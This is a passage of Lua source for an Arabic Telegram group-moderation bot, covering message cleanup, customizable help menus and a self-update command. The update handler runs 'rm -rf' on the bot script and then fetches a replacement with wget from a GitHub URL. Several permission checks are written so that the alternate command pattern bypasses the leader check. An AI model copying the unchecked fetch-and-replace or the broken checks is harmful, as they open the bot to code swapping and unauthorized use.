pm = '❗️☻ Please use a number greater than 1 and less than 100 '
else
pm = '❗️🚸 ⌯ ٱختر رقم ٱكثر من 1 وٱقڵ من 100'
end
Dev_Abs(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
pm ='❗️☻ *'..matches[2]..' recent message removed* '
else
pm ='❗️🚸 ⌯ تـۖم حـذف ( '..matches[2]..' ) مـن ٱڵـرسٱئـڵ'
end
Dev_Abs(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
pm ='❗️☻ This is not possible in the conventional group '
else
pm ='❗️🚸 ⌯ هنٱك خطٱ '
end
Dev_Abs(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
if text:match('^[Cc]lean (%d+)$') then
local matches = {string.match(text, "^([Cc]lean) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
pm = '❗️☻ Please use a number greater than 1 and less than 100 '
else
pm = '❗️🚸 ⌯ ٱختر رقم ٱكثر من 1 وٱقڵ من 100'
end
Dev_Abs(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
pm ='❗️☻ *'..matches[2]..' recent message removed* '
else
pm ='❗️🚸 ⌯ تـۖم حـذف ( '..matches[2]..' ) مـن ٱڵـرسٱئـڵ'
end
Dev_Abs(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
pm ='❗️☻ This is not possible in the conventional group '
else
pm ='❗️🚸 ⌯ هنٱك خطٱ '
end
Dev_Abs(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
end
--     Source loolIQ     --
if is_leader(msg) and text:match("^استعاده الاوامر$") then
DevAbs:del(loolIQ..'bot:help', text)
DevAbs:del(loolIQ..'bot:help1', text)
DevAbs:del(loolIQ..'bot:help2', text)
DevAbs:del(loolIQ..'bot:help3', text) 
DevAbs:del(loolIQ..'bot:help4', text)
DevAbs:del(loolIQ..'bot:help5', text) 
DevAbs:del(loolIQ..'bot:help6', text) 
DevAbs:del(loolIQ..'bot:help7', text)
DevAbs:del(loolIQ..'bot:help8', text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم ٱستعٱدة ٱڵـكـلٱيش ٱلٱصڵيه" ,  1, "md") 
end
if is_leader(msg) and text:match("^تعيين الاوامر$") or text:match("^تعيين امر الاوامر$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (الاوامر) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help0'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(loolIQ..'bot:help0'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^الاوامر$") or text:match("^اوامر$") or text:match("^مساعده$") then
local help = DevAbs:get(loolIQ..'bot:help')
local text =  [[
❗️🎒 ⌯ Welcome to help list 
❗️🎒 ⌯ اهلا بك في قائمة الاوامر 
〰️➖〰️➖〰️➖〰️➖〰️
⚙️ ⌯ {م1} ⌯» اوامـر حماية المجموعة 
⚜️ ⌯ {م2} ⌯» اوامـر المشرفين
📂 ⌯ {م3} ⌯» اوامـر الخدمة
📋 ⌯ {م4} ⌯» اوامـر الوضع والتعيين
📨 ⌯ {م5} ⌯» اوامـر الرفع والتنزيل
🖲 ⌯ {م6} ⌯» اوامـر التفعيل والتعطيل
🗃 ⌯ {م7} ⌯» اوامـر حذف القوائم
🗂 ⌯ {م8} ⌯» اوامـر المطورين
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]] 
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م1$") or text:match("^تعيين امر م١$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م1) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help01'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(loolIQ..'bot:help01'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help1', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م1$") or  text:match("^م١$") or text:match("^اوامر1$") or text:match("^اوامر١$") then
local help = DevAbs:get(loolIQ..'bot:help1')
local text =  [[
❗️🎒 ⌯ Protection orders
❗️🎒  ⌯ اوامر حماية المجموعه
〰️➖〰️➖〰️➖〰️➖〰️
🧩 ⌯ قفل • فتح ⌯» الروابط
♟ ⌯ قفل • فتح ⌯» المعرف
🚸 ⌯ قفل • فتح ⌯» البوتات
🗯 ⌯ قفل • فتح ⌯» الشارحه
🎨 ⌯ قفل • فتح ⌯» المتحركه
🎭 ⌯ قفل • فتح ⌯» الملصقات
🗂 ⌯ قفل • فتح ⌯» الملفات
🔖 ⌯ قفل • فتح ⌯» الصور
🎬 ⌯ قفل • فتح ⌯» الفيديو
🖲 ⌯ قفل • فتح ⌯» الاونلاين
💬 ⌯ قفل • فتح ⌯» الدردشه
🧬 ⌯ قفل • فتح ⌯» التوجيه
🎧 ⌯ قفل • فتح ⌯» الاغاني
🎤 ⌯ قفل • فتح ⌯» الصوت
📟 ⌯ قفل • فتح ⌯» الجهات
🕹 ⌯ قفل • فتح ⌯» الماركداون
⚙️ ⌯ قفل • فتح ⌯» الحمايه
🖇 ⌯ قفل • فتح ⌯» التكرار
🏮 ⌯ قفل • فتح ⌯» الهاشتاك
🛠 ⌯ قفل • فتح ⌯» التعديل
🔱 ⌯ قفل • فتح ⌯» التثبيت
🥁 ⌯ قفل • فتح ⌯» الاشعارات
📑 ⌯ قفل • فتح ⌯» الكلايش
📶 ⌯ قفل • فتح ⌯» الشبكات
📱 ⌯ قفل • فتح ⌯» المواقع
🔞 ⌯ قفل • فتح ⌯» الفشار
📿 ⌯ قفل • فتح ⌯» الكفر
🗃 ⌯ قفل • فتح ⌯» الكل
📕 ⌯ قفل • فتح ⌯» العربيه
📘 ⌯ قفل • فتح ⌯» الانكليزيه
📙 ⌯ قفل • فتح ⌯» الفارسيه
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر حمايه اخرى
〰️➖〰️➖〰️➖〰️➖〰️
❕ ⌯ قفل • فتح ⌯» ⤈
📚 ⌯ الفارسيه بالطرد
🥇 ⌯ البوتات بالطرد
🥈 ⌯ البوتات بالتقييد
⏰ ⌯ الكل بالساعات + عدد الساعات
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م2$") or text:match("^تعيين امر م٢$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م2) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help21'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(loolIQ..'bot:help21'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help2', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م2$") or text:match("^م٢$") or text:match("^اوامر2$") or text:match("^اوامر٢$") then
local help = DevAbs:get(loolIQ..'bot:help2')
local text =  [[
❗️🎒 ⌯ Supervisor orders
❗️🎒  ⌯ اوامر المشرفين
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر الطرد والحظر
〰️➖〰️➖〰️➖〰️➖〰️
🏌🏻‍♂️ ⌯ طرد الحسابات المحذوفه
🏌🏻‍♀️ ⌯ طرد ⌯» بالرد بالمعرف بالايدي
🔞 ⌯ حظر • الغاء حظر ⤈
⌯ بالرد • بالمعرف • بالايدي ⌯
🚫 ⌯ كتم • الغاء كتم ⤈
⌯ بالرد • بالمعرف • بالايدي ⌯
📛 ⌯ تقييد • الغاء التقييد ⤈
⌯ بالرد • بالمعرف • بالايدي ⌯
📍 ⌯ حذف الكل
🔇 ⌯ منع + الكلمه
🔊 ⌯ الغاء منع + الكلمه
🎯 ⌯ تنظيف قائمه الحظر
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ قوائم المجموعة
〰️➖〰️➖〰️➖〰️➖〰️
💯 ⌯ حذف القوائم ⌯» لحذف الكل
♨️ ⌯ حذف + اسم القائمة ⌯» للحذف
🧧 ⌯ اسم القائمة ⌯» لعرض معلوماتها
🚸 ⌯ { المميزين } • { قائمه المنع }
🔑 ⌯ { المنشئين } • { المحظورين }
🎗 ⌯ { المدراء } • { الاعدادات }
⚜️ ⌯ { الادمنيه } • { المكتومين }
⚠️ ⌯ { المطايه } • { الصلاحيات }
🏆 ⌯ { المقيدين } • { المميزين العام }
🏅 ⌯ { الدعم } • { المدراء العامين }
🔅 ⌯ { الردود } • { الادمنيه العامين }
🎖 ⌯ { الاوامر المضافه }
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر اخرى
〰️➖〰️➖〰️➖〰️➖〰️
🚸 ⌯ تاك للكل
♨️ ⌯ حذف البوتات
💢 ⌯ حذف + العدد
🔆 ⌯ اعاده التثبيت
📯 ⌯ كلهم + الكلمه
♟ ⌯ اضافه + المعرف
🚸 ⌯ تاك للكل • صيحهم
🗯 ⌯ اضف • حذف ⌯» رد
💠 ⌯ اضف • حذف ⌯» امر
📨 ⌯ اضف رسائل + الايدي
🔱 ⌯ تثبيت • الغاء التثبيت
🎗 ⌯ اضف • حذف ⌯» صلاحيه
💬 ⌯ جلب • حذف ⌯» الترحيب
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م3$") or text:match("^تعيين امر م٣$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م3) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help31'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(loolIQ..'bot:help31'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help3', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م3$") or text:match("^م٣$") or text:match("^اوامر3$") or text:match("^اوامر٣$") then
local help = DevAbs:get(loolIQ..'bot:help3')
local text =  [[
❗️🎒 ⌯ Service orders
❗️🎒  ⌯ اوامر الخدمه
〰️➖〰️➖〰️➖〰️➖〰️
📣 ⌯ اهمس
⏰ ⌯ الوقت 
📆 ⌯ التاريخ
💬 ⌯ زخرفه
🧩 ⌯ الرابط
🚸 ⌯ موقعي
🎗 ⌯ رتبتي
🔅 ⌯ معلوماتي
☎️ ⌯ جهاتي
🧼 ⌯ صورتي
🧻 ⌯ صورتي + الرقم
✉️ ⌯ رسائلي
📩 ⌯ رسائلي اليوم
📧 ⌯ حذف رسائلي
📨 ⌯ اضف رسائل + الايدي
🔖 ⌯ اسمي
📦 ⌯ معرفي
🦠 ⌯ ايدي
🧬 ⌯ ايديي
💎 ⌯ نقاطي
💵 ⌯ بيع نقاطي
🎮 ⌯ الالعاب
🗞 ⌯ القوانين
📛 ⌯ رابط الحذف
📰 ⌯ السورس
📓 ⌯ المطور
⚠️ ⌯ تاك للكل
〽️ ⌯ كلهم + الكلمه 
📈 ⌯ مشاهدات المنشور
📋 ⌯ ايدي المجموعه
📜 ⌯ اسم المجموعه
🧾 ⌯ معلومات المجموعه
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر اخرى
〰️➖〰️➖〰️➖〰️➖〰️
⚜️ ⌯ ايدي بالرد
🧪 ⌯ كول + الكلمه
🌦 ⌯ طقس + اسم المدينه
💌 ⌯ بوسه • بوسها ⌯» بالرد
🗡 ⌯ هينه ⌯» بالرد بالمعرف
🧽 ⌯ رتبته ⌯» بالرد بالمعرف
📣 ⌯ صيحه ⌯» بالرد • بالمعرف
📯 ⌯ صيحها ⌯» بالرد • بالمعرف
🔑 ⌯ كشف ⌯» بالرد • بالمعرف • بالايدي
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م4$") or text:match("^تعيين امر م٤$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م4) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help41'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(loolIQ..'bot:help41'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help4', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٤$") or text:match("^م4$") or text:match("^اوامر4$") or text:match("^اوامر٤$") then
local help = DevAbs:get(loolIQ..'bot:help4')
local text =  [[
❗️🎒 ⌯ Status orders
❗️🎒  ⌯ اوامر الوضع
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر وضع الايدي
〰️➖〰️➖〰️➖〰️➖〰️
🎖 ⌯ تعيين الايدي ⌯» لتغيير الكليشه
🥇 ⌯ حذف الايدي ⌯» لحذف الكليشه
☔️ ⌯ ضع ⌯» الايدي بالصوره
☂️ ⌯ ضع ⌯» الايدي بدون صوره
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر وضع التكرار
〰️➖〰️➖〰️➖〰️➖〰️
📛 ⌯ ضع ⌯» تكرار + العدد
📌 ⌯ ضع ⌯» التكرار بالطرد
✂️ ⌯ ضع ⌯» التكرار بالحذف
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر الوضع بالتحذير
〰️➖〰️➖〰️➖〰️➖〰️
⛔️ ⌯ ضع ⌯» الكفر بالتحذير
🛑 ⌯ ضع ⌯» الكفر بدون تحذير

🔔 ⌯ ضع ⌯» الفشار بالتحذير
🔕 ⌯ ضع ⌯» الفشار بدون تحذير

🔉 ⌯ ضع ⌯» الفارسيه بالتحذير
🔇 ⌯ ضع ⌯» الفارسيه بدون تحذير
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ ضع + الامر
〰️➖〰️➖〰️➖〰️➖〰️
🧼 ⌯ ضع ⌯» صوره
🧩 ⌯ ضع ⌯» الرابط
🚸 ⌯ ضع ⌯» ترحيب
🔖 ⌯ ضع ⌯» اسم + الاسم
📁 ⌯ ضع ⌯» قوانين + الكليشة
🖍 ⌯ ضع ⌯» عدد الاحرف + العدد
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م5$") or text:match("^تعيين امر م٥$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م5) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help51'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(loolIQ..'bot:help51'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help5', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٥$") or text:match("^م5$") or text:match("^اوامر5$") or text:match("^اوامر٥$") then
local help = DevAbs:get(loolIQ..'bot:help5')
local text =  [[
❗️🎒 ⌯ Upload and download
❗️🎒  ⌯ اوامر الرفع والتنزيل
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ الاوامر  الخاصه بالمشرفين
〰️➖〰️➖〰️➖〰️➖〰️
📯 ⌯ تنزيل الكل
🏅 ⌯ رفع المشرفين
🔆 ⌯ رفع • تنزيل ⌯» منشئ
🎗 ⌯ رفع • تنزيل ⌯» مدير
⚜️ ⌯ رفع • تنزيل ⌯» ادمن
🔅 ⌯ رفع • تنزيل ⌯» مميز
✨ ⌯ رفع • تنزيل ⌯» ادمن بالكروب
🏆 ⌯ رفع بكل الصلاحيات
📁 ⌯ الغاء خاصيه التثبيت
📂 ⌯ الغاء خاصيه تغيير الاسم
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ الاوامر الخاصه بالمطورين
〰️➖〰️➖〰️➖〰️➖〰️
🎗 ⌯ رفع • تنزيل ⌯» مدير عام
⚜️ ⌯ رفع • تنزيل ⌯» ادمن عام
🔅 ⌯ رفع • تنزيل ⌯» مميز عام
🎖 ⌯ رفع • تنزيل ⌯» مطور ثالث
🔱 ⌯ رفع • تنزيل ⌯» منشئ اساسي
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م6$") or text:match("^تعيين امر م٦$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م6) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help61'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(loolIQ..'bot:help61'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help6', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٦$") or text:match("^م6$") or text:match("^اوامر6$") or text:match("^اوامر٦$") then
local help = DevAbs:get(loolIQ..'bot:help6')
local text =  [[
❗️🎒 ⌯ Activation and deactivation
❗️🎒  ⌯ اوامر التفعيل والتعطيل
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر تفعيلات المشرفين
〰️➖〰️➖〰️➖〰️➖〰️
🎮 ⌯ تفعيل • تعطيل ⌯» الالعاب
🎗 ⌯ تفعيل • تعطيل ⌯» الايدي
🧩 ⌯ تفعيل • تعطيل ⌯» الرابط
📛 ⌯ تفعيل • تعطيل ⌯» الحظر
⛔️ ⌯ تفعيل • تعطيل ⌯» الطرد
🛑 ⌯ تفعيل • تعطيل ⌯» اطردني
🧬 ⌯ تفعيل • تعطيل ⌯» ردود البوت
🏵 ⌯ تفعيل • تعطيل ⌯» جلب الصوره
⛑ ⌯ تفعيل • تعطيل ⌯» تنبيه التغيرات
🎨 ⌯ تفعيل • تعطيل ⌯» الايدي بالصوره
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر تفعيلات المطورين
〰️➖〰️➖〰️➖〰️➖〰️
🏆 ⌯ تفعيل ⌯ تعطيل ⌯
📢 ⌯ تفعيل • تعطيل ⌯» التنبيه
🎴 ⌯ تفعيل • تعطيل ⌯» كل الكروبات
🎲 ⌯ تفعيل • تعطيل ⌯» البوت الخدمي
🎖 ⌯ تفعيل • تعطيل ⌯» الاشتراك الاجباري
🎤 ⌯ رد الخاص ⌯» تفعيل • تعطيل
🎼 ⌯ المغادره التلقائيه ⌯» تفعيل • تعطيل
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م7$") or text:match("^تعيين امر م٧$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م7) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help71'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help71'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(loolIQ..'bot:help71'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help7', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٧$") or text:match("^م7$") or text:match("^اوامر7$") or text:match("^اوامر٧$") then
local help = DevAbs:get(loolIQ..'bot:help7')
local text =  [[
❗️🎒 ⌯ Orders to delete liste
❗️🎒  ⌯ اوامر حذف القوائم
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر الحذف للمشرفين
〰️➖〰️➖〰️➖〰️➖〰️
📕 ⌯ حذف القوائم
🧩 ⌯ حذف الروابط
🎖 ⌯ حذف البوتات
🎗 ⌯ حذف المدراء
⚜️ ⌯ حذف الادمنيه
🔅 ⌯ حذف المميزين
🚷 ⌯ حذف المقيدين
📵 ⌯ حذف المكتومين
🚯 ⌯ حذف قائمه المنع
🚳 ⌯ حذف المحضورين
🚭 ⌯ حذف الاوامر المضافه
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر الحذف للمطورين
〰️➖〰️➖〰️➖〰️➖〰️
🎖 ⌯ حذف المطورين
🎗 ⌯ حذف المنشئين
🚸 ⌯ حذف قائمه المنع
🏆 ⌯ حذف ردود المطور
🔅 ⌯ حذف المميزين عام
🎗 ⌯ حذف المدراء العامين
⚜️ ⌯ حذف الادمنيه العامين
🔱 ⌯ حذف المنشئين الاساسيين
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م8$") or text:match("^تعيين امر م٨$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ⌯ ٱرسـڵ كڵيشة (م8) ٱلٱن " ,  1, "md")
DevAbs:set(loolIQ..'bot:help81'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(loolIQ..'bot:help81'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(loolIQ..'bot:help81'..msg.sender_user_id_..'', 'no')
DevAbs:set(loolIQ..'bot:help8', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٨$") or text:match("^م8$") or text:match("^اوامر8$") or text:match("^اوامر٨$") then
local help = DevAbs:get(loolIQ..'bot:help8')
local text =  [[
❗️🎒 ⌯ Developers orders
❗️🎒  ⌯ اوامر المطورين
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ تعيين كلايش الاوامر
〰️➖〰️➖〰️➖〰️➖〰️
📚 ⌯ استعاده الاوامر
📒 ⌯ تعيين ⌯» الاوامر
📕 ⌯ تعيين ⌯» امر م1 • امر م2
📗 ⌯ تعيين ⌯» امر م3 • امر م4
📘 ⌯ تعيين ⌯» امر م5 • امر م6
📙 ⌯ تعيين ⌯» امر م7 • امر م8
〰️➖〰️➖〰️➖〰️➖〰️
♻️ ⌯ تحديث
🎗 ⌯ السيرفر 
🧩 ⌯ الكروبات
⚜️ ⌯ المطورين
🧬 ⌯ الاحصائيات
🗞 ⌯ المجموعات
🔗 ⌯ روابط الكروبات
♻️ ⌯ تحديث السورس
⚠️ ⌯ اسم البوت + غادر
🏆 ⌯ ضع كليشه المطور
📥 ⌯ نسخه ملف السورس
🧾 ⌯ معلومات المجموعه
〰️➖〰️➖〰️➖〰️➖〰️
❗️📮 ⌯ اوامر العام للمطورين
〰️➖〰️➖〰️➖〰️➖〰️
🗽 ⌯ اضف رد عام
🗼 ⌯ حذف رد عام
🏰 ⌯ ردود المطور • ردود العام

⛔️ ⌯ حظر عام
🛑 ⌯ الغاء العام
📮 ⌯ قائمه العام

🔑 ⌯ ضع دعم
🚸 ⌯ حذف الدعم

📛 ⌯ تنظيف الرسائل 
📛 ⌯ تنضيف الكروبات

✉️ ⌯ ضع ملاحضه + الملاحضه
📩 ⌯ جلب الملاحضه

📬 ⌯ ضع رد الخاص + الكليشه
📪 ⌯ جلب رد الخاص
📭 ⌯ حذف رد الخاص

🕹 ⌯ وضع • تغيير ⌯» اسم البوت
🖲 ⌯ حذف اسم البوت

📂 ⌯ جلب نسخه الكروبات
📁 ⌯ رفع النسخه + بالرد على الملف

💷 ⌯ الاشتراك الاجباري
💵 ⌯ تعيين الاشتراك الاجباري
💶 ⌯ قناة الاشتراك
💴 ⌯ تغيير قناة الاشتراك
💰 ⌯ حذف قناة الاشتراك

✨ ⌯ جلب كليشه الاشتراك
🛎 ⌯ تغيير كليشه الاشتراك
💥 ⌯ حذف كليشه الاشتراك

📣 ⌯ اذاعه + الكليشه
📢 ⌯ نشر بالخاص + الكليشه
📯 ⌯ توجيه للكل + بالرد على الرساله

🔖 ⌯ كشف + -ايدي المجموعه
📌 ⌯ غادر + -ايدي المجموعه

💢 ⌯ فلتر عام + الكلمه ⌯» للمنع
♨️ ⌯ الغاء فلتر عام + الكلمه
🧧 ⌯ قائمه المنع العام
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏆 ⌯ Dev ⌯» ]]..SUDOUSERNAME..[[ 
❗️🏵 ⌯ CH ⌯» @loolIQ
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     Source loolIQ     --
if text == "تحديث السورس" and is_leader(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ جٱري تـۧحډيث سۄرس ډيف برۄكس', 1, 'md') 
os.execute('rm -rf loolIQ.lua') 
os.execute('wget https://raw.githubusercontent.com/iq0abs/loolIQ/master/loolIQ.lua') 
